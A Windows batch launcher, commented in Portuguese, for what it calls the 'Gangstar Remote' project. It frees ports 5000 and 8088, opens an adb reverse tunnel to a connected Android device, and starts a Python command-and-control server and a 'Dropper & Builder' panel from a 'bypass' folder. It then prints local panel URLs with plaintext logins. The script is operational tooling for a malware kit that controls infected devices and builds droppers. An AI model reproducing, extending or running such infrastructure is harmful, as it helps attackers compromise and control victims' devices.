@echo off
title Iniciar Projeto Gangstar C^&C + Painel
echo =======================================================================
echo               ATIVANDO PROJETO GANGSTAR REMOTE
echo =======================================================================
echo.

set "ROOT_DIR=%~dp0"
set "SERVER_DIR=%ROOT_DIR%server"
set "BYPASS_DIR=%SERVER_DIR%\projeto_bypass"

echo [1/3] Liberando portas 5000 e 8088 e ativando ponte USB adb...
powershell -Command "Get-NetTCPConnection -LocalPort 5000,8088 -ErrorAction SilentlyContinue | ForEach-Object { Stop-Process -Id $_.OwningProcess -Force -ErrorAction SilentlyContinue }" >nul 2>&1
adb reverse tcp:5000 tcp:5000 >nul 2>&1

echo [2/3] Iniciando Servidor C^&C (Porta 5000)...
start "Gangstar C^&C Server (5000)" /D "%SERVER_DIR%" python main.py

powershell -Command "Start-Sleep -Seconds 2" >nul 2>&1

echo [3/3] Iniciando Painel Dropper ^& Builder (Porta 8088)...
start "Gangstar Builder/Bypass (8088)" /D "%BYPASS_DIR%" python app.py

echo.
echo =======================================================================
echo   SERVIDORES INICIADOS COM SUCESSO!
echo.
echo   Painel C^&C / Dispositivos:  http://192.168.1.14:5000 (ws://192.168.1.14:5000/ws)
echo      Usuario: admin
echo      Senha:   admin
echo.
echo   Painel Dropper ^& Builder:   http://192.168.1.14:8088/login
echo      Usuario: risadinhaxx7@@
echo      Senha:   risadinhaxx7@@
echo =======================================================================
echo.
pause
